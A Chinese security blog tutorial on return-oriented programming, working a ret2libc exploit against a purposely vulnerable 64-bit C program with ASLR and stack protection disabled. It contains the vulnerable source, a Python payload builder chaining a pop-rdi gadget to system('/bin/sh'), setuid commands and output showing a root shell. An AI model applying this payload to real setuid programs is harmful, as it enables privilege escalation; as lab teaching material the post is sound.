---
layout: blog
book: true
title:  "简单的ROP"
background: green
background-image: http://ot1cc1u9t.bkt.clouddn.com/17-7-15/78939382.jpg
date:   2018-08-28 14:43:11
category: 安全
tags:
- ROP 
---

- 现代栈溢出利用技术基础:ROP
- 利用signal机制的ROP技术:SROP
- 没有binary怎么办:BROP
- 劫持栈指针:Stack Pivot
- 利用动态链接绕过ASLR:ret2dll resolve、fake linkmap
- 利用地址低12bit绕过ASLR:Partial Overwrite
- 绕过stack canary:改写指针与局部变量、leak canary、overwrite canary
- 溢出位数不够怎么办:覆盖ebp,Partial Overwrite

----

## 0x01、实例

```c++
/* Compile: gcc -fno-stack-protector ret2libc.c -o ret2libc      */
/* Disable ASLR: echo 0 > /proc/sys/kernel/randomize_va_space     */

#include <stdio.h>
#include <unistd.h>

int vuln() {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Try to exec /bin/sh");
    vuln();
    return 0;
}   
```

编译后，进行下列步骤：

1.安装[gdb-peda](https://github.com/longld/peda)，然后gdb ./ret2libc->start->find "/bin/sh"，得到地址0x7ffff7b91543；

2.继续，使用p system，找到system函数的地址0x7ffff7a57590；

3.安装[ropper](https://github.com/sashs/Ropper)，然后使用ropper --file ./ret2libc --search "% ?di"，找到pop %rdi; ret;的地址0x00000000004006a3。


注意，因为我们是64位机器，默认使用的是寄存器rdi等传递参数，所以，我们需要使用rop技术，先将栈上的参数pop到寄存器rdi中，再调用system()函数。

接着，使用这三个地址，构造payload：
```python
#!/usr/bin/env python

from struct import *

buf = ""
buf += 'A'*104                          # junk
buf += pack("<Q", 0x00000000004006a3)       # pop rdi; ret;
buf += pack("<Q", 0x7ffff7b91543)       # pointer to "/bin/sh" gets popped into rdi
buf += pack("<Q", 0x7ffff7a57590)       # address of system()
#print buf
f = open("in.txt", "w")
f.write(buf)
```

执行该脚本，生成payload文件in.txt。

给./ret2libc添加权限:

```
sudo chown root ./ret2libc
sudo chmod 4755 ./ret2libc
```

执行：
```
➜  Desktop (cat in.txt ; cat) | ./ret2libc
Try to exec /bin/sh
Read 128 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
No shell for you :(
whoami
root
```

成功获得root shell。

![Shell](https://raw.githubusercontent.com/catsay217994/catsay217994.github.io/master/_posts/security_image/rop.png "ROP")
